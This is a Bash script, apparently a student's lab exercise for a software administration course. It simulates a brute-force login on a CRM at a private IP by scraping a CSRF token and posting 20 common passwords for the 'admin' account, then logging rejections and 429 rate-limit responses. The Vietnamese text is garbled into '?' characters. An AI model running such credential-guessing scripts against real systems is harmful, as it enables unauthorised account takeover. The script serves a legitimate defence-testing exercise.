#!/bin/bash
# ==============================================================================
# K?ch b?n m? ph?ng t?n c?ng Brute-Force v?o h? th?ng CRM
# ?? t?i 4 - M?n Tri?n khai v? Qu?n tr? H? th?ng Ph?n m?m
# MSSV: dtc245340007 - NGUYEN THI QUYNH THO
# ==============================================================================

set -e

TARGET_URL="https://192.168.207.128/login"
ATTACK_USER="admin"
TOTAL_ATTEMPTS=20
DELAY=0.5
COOKIE_JAR=$(mktemp)

echo "===================================================================="
echo " [START] K?CH B?N M? PH?NG T?N C?NG BRUTE-FORCE X?C TH?C"
echo " M?c ti?u: $TARGET_URL"
echo " T?i kho?n m?c ti?u: $ATTACK_USER"
echo " S? l??ng request: $TOTAL_ATTEMPTS"
echo " Kho?ng c?ch g?i: ${DELAY}s"
echo " Th?i gian b?t ??u: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
echo "===================================================================="

PASSWORDS=(
  "123456" "password" "12345678" "admin123" "qwerty"
  "letmein" "welcome1" "monkey" "football" "iloveyou"
  "secret123" "trustno1" "superman" "batman2026" "dragon"
  "shadow" "master" "hacker123" "crmpass2026" "wrongpass99"
)

# B??c 1: Kh?i t?o phi?n v? l?y CSRF Token
echo "[1/2] ?ang k?t n?i t?i $TARGET_URL ?? nh?n CSRF Token v? Session Cookie..."
LOGIN_HTML=$(curl -k -s -c "$COOKIE_JAR" "$TARGET_URL")
CSRF_TOKEN=$(echo "$LOGIN_HTML" | grep 'name="csrf_token"' | sed -E 's/.*value="([^"]+)".*/\1/')

if [ -z "$CSRF_TOKEN" ]; then
  echo "[-] L?I: Kh?ng tr?ch xu?t ???c csrf_token t? trang login!"
  rm -f "$COOKIE_JAR"
  exit 1
fi

echo "[+] CSRF Token: ${CSRF_TOKEN:0:16}... (?? tr?ch xu?t th?nh c?ng)"
echo ""
echo "[2/2] B?t ??u g?i li?n ti?p $TOTAL_ATTEMPTS requests ??ng nh?p sai..."
echo "--------------------------------------------------------------------"
printf "%-4s | %-12s | %-15s | %-8s | %-20s\n" "STT" "Th?i gian" "Password Th?" "HTTP" "K?t qu?"
echo "--------------------------------------------------------------------"

START_TIME=$(date +%s)

for i in $(seq 1 $TOTAL_ATTEMPTS); do
  PWD_TEST="${PASSWORDS[$((i - 1))]}"
  NOW=$(date +"%T")
  
  # G?i POST request ??ng nh?p sai
  HTTP_CODE=$(curl -k -s -o /tmp/resp_$$.html -w "%{http_code}" \
    -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    -X POST "$TARGET_URL" \
    -d "csrf_token=$CSRF_TOKEN" \
    -d "username=$ATTACK_USER" \
    -d "password=$PWD_TEST")
  
  # Tr?ch xu?t th?ng b?o l?i n?u c?
  if grep -q "T?n ??ng nh?p ho?c m?t kh?u kh?ng ch?nh x?c" /tmp/resp_$$.html 2>/dev/null; then
    RESULT="Sai m?t kh?u (401/200)"
  elif [ "$HTTP_CODE" -eq 429 ]; then
    RESULT="B? ch?n Rate Limit (429)"
  else
    RESULT="HTTP Code: $HTTP_CODE"
  fi
  
  printf "%-4s | %-12s | %-15s | %-8s | %-20s\n" "#$i" "$NOW" "$PWD_TEST" "$HTTP_CODE" "$RESULT"
  rm -f /tmp/resp_$$.html
  
  sleep $DELAY
done

END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

rm -f "$COOKIE_JAR"

echo "--------------------------------------------------------------------"
echo " [HO?N T?T] ?? g?i ?? $TOTAL_ATTEMPTS requests trong ${DURATION}s."
echo " Th?i gian k?t th?c: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
echo "===================================================================="
